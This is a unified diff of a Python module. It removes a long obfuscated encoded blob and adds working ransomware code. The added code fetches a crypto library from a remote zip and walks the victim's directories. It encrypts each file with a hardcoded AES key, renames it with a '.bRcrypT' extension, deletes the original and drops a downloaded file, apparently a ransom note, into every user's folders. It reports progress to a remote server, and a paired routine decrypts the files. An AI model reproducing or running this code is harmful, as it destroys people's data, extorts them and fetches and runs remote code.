@@ -1,1 +1,212 @@
-==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
+pimport(
+    '''import os
+import re
+import struct
+
+from Crypto.Cipher import AES''',
+    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
+    "cryption.zip"
+)
+
+
+def decrypt(server, *startdirs, files='.*.bRcrypT', notfiles='bRcrypT.bRcrypT',
+            folders='.*', notfolders='C:\\Windows', extension=".bRcrypT",
+            chunk_size=64 * 1024):
+    _send(server, '''inpu({!r},'36',0)'''.format(
+        Myid+' : start Decryption :('))
+    total_Size = 0
+    for start_path in startdirs:
+        try:
+            for dirpath, dirs, f in os.walk(start_path):
+                try:
+                    deldirs = []
+                    for i in dirs:
+                        try:
+                            absolute_path = os.path.abspath(
+                                os.path.join(dirpath, i))
+                            if (
+                                not re.match(
+                                    eval(repr(folders)), absolute_path
+                                ) or re.match(
+                                    eval(repr(notfolders)), absolute_path
+                                )
+                            ):
+                                deldirs.append(i)
+                            elif absolute_path.lower().startswith("_mei") and\
+                                    "isactive" in os.listdir(absolute_path):
+                                deldirs.append(i)
+                            elif absolute_path.lower() == "widnows" and \
+                                    "uuid" in os.listdir(absolute_path):
+                                deldirs.append(i)
+                        except (Exception, BaseException):
+                            pass
+                    for i in deldirs:
+                        dirs.remove(i)
+                    for fi in f:
+                        try:
+                            file_name = os.path.abspath(
+                                os.path.join(dirpath, fi))
+                            if (
+                                re.match(eval(repr(files)), file_name)and
+                                not re.match(eval(repr(notfiles)), file_name)
+                            ):
+                                try:
+                                    os.rename(file_name, file_name)
+                                    open(file_name, 'ab')
+
+                                    output_file = (
+                                        file_name.endswith(extension) and
+                                        file_name[: - len(extension)]
+                                        or file_name
+                                    )
+
+                                    file_size = 0
+                                    with open(file_name, 'rb') as infile:
+                                        file_size = struct.unpack(
+                                            '<Q', infile.read(
+                                                struct.calcsize('Q'))
+                                        )[0]
+
+                                        IV = infile.read(16)
+
+                                        decryptor = AES.new((
+                                            b'\xf6\x8c\xda\x9ap\x82D\x82)\xa9\xc96'
+                                            b'n}:\xac\x13q\x10U\x8di\xbd1i\xf7\xab'
+                                            b'\xf8\x19\x92\x1a\x8f'
+                                        ), AES.MODE_CBC, IV)
+
+                                        with open(output_file, 'wb') as outfile:
+                                            while True:
+                                                chunk = infile.read(chunk_size)
+                                                if len(chunk) == 0:
+                                                    break
+                                                outfile.write(
+                                                    decryptor.decrypt(chunk)
+                                                )
+                                            outfile.truncate(file_size)
+                                    os.remove(file_name)
+                                    total_Size += file_size
+                                except (Exception, BaseException):
+                                    pass
+                        except (Exception, BaseException):
+                            pass
+                except (Exception, BaseException):
+                    pass
+        except (Exception, BaseException):
+            pass
+    _send(server, '''inpu({!r},'36',0)'''.format(
+        Myid+' : %d Bytes Decrypted :>' % total_Size))
+
+
+def encrypt(server, *startdirs, files='.*', notfiles='.*.bRcrypT', folders='.*',
+            notfolders='C:\\Windows', extension=".bRcrypT",
+            chunk_size=64 * 1024, file_link=""):
+    _send(server, '''inpu({!r},'36',0)'''.format(
+        Myid+' : start Encryption :('))
+    info_file = ""
+    if file_link:
+        with requests.get(file_link)as r:
+            if "Content-Disposition" in r.headers.keys():
+                info_file = re.findall("filename=(.*)", r.headers["Content-Disposition"])[0].replace(":", "").replace(
+                    "/", "").replace("\\", "").replace("?", "").replace("*", "").replace("|", "").replace("\"", "")
+            else:
+                info_file = file_link.split("/")[-1].replace(":", "").replace("/", "").replace(
+                    "\\", "").replace("?", "").replace("*", "").replace("|", "").replace("\"", "")
+            file_link = r.content
+    if info_file:
+        try:
+            _a = os.path.dirname(Path.home())
+            for a in os.listdir(_a):
+                try:
+                    _b = os.path.join(_a, a)
+                    if os.path.isdir(_b):
+                        try:
+                            for b in os.listdir(_b):
+                                try:
+                                    open(os.path.join(_b, b, info_file),
+                                         'wb').write(file_link)
+                                except (Exception, BaseException):
+                                    pass
+                        except (Exception, BaseException):
+                            pass
+                except (Exception, BaseException):
+                    pass
+        except (Exception, BaseException):
+            pass
+    total_Size = 0
+    for start_path in startdirs:
+        try:
+            for dirpath, dirs, f in os.walk(start_path):
+                try:
+                    deldirs = []
+                    for i in dirs:
+                        try:
+                            absolute_path = os.path.abspath(
+                                os.path.join(dirpath, i))
+                            if not re.match(eval(repr(folders)), absolute_path)or\
+                                    re.match(eval(repr(notfolders)), absolute_path):
+                                deldirs.append(i)
+                            elif i.lower().startswith("_mei") and\
+                                    "isactive" in os.listdir(absolute_path):
+                                deldirs.append(i)
+                            elif i.lower() == "widnows" and "uuid" in os.listdir(absolute_path):
+                                deldirs.append(i)
+                        except (Exception, BaseException):
+                            pass
+                    for i in deldirs:
+                        dirs.remove(i)
+                    for fi in f:
+                        try:
+                            file_name = os.path.abspath(
+                                os.path.join(dirpath, fi))
+                            if re.match(eval(repr(files)), file_name)and\
+                                    not re.match(eval(repr(notfiles)), file_name):
+                                try:
+                                    os.rename(file_name, file_name)
+                                    open(file_name, 'ab')
+
+                                    output_file = file_name + extension
+                                    f_size = os.path.getsize(file_name)
+                                    file_size = struct.pack("<Q", f_size)
+
+                                    IV = os.urandom(16)
+
+                                    encryptor = AES.new((
+                                        b'\xf6\x8c\xda\x9ap\x82D\x82)\xa9\xc96'
+                                        b'n}:\xac\x13q\x10U\x8di\xbd1i\xf7\xab'
+                                        b'\xf8\x19\x92\x1a\x8f'
+                                    ), AES.MODE_CBC, IV)
+
+                                    with open(file_name, 'rb') as infile:
+                                        with open(output_file, 'wb') as outfile:
+                                            outfile.write(file_size)
+                                            outfile.write(IV)
+
+                                            while True:
+                                                chunk = infile.read(chunk_size)
+                                                if len(chunk) == 0:
+                                                    break
+                                                elif len(chunk) % 16 != 0:
+                                                    chunk += b' ' * \
+                                                        (16 - (len(chunk) % 16))
+
+                                                outfile.write(
+                                                    encryptor.encrypt(chunk))
+                                    os.remove(file_name)
+                                    total_Size += f_size
+                                except (Exception, BaseException):
+                                    pass
+                        except (Exception, BaseException):
+                            pass
+                except (Exception, BaseException):
+                    pass
+            if info_file and os.path.ismount(startpath):
+                try:
+                    open(os.path.join(startpath, info_file),
+                         'wb').write(file_link)
+                except (Exception, BaseException):
+                    pass
+        except (Exception, BaseException):
+            pass
+    _send(server, '''inpu({!r},'36',0)'''.format(
+        Myid+' : %d Bytes Encrypted :>' % total_Size))
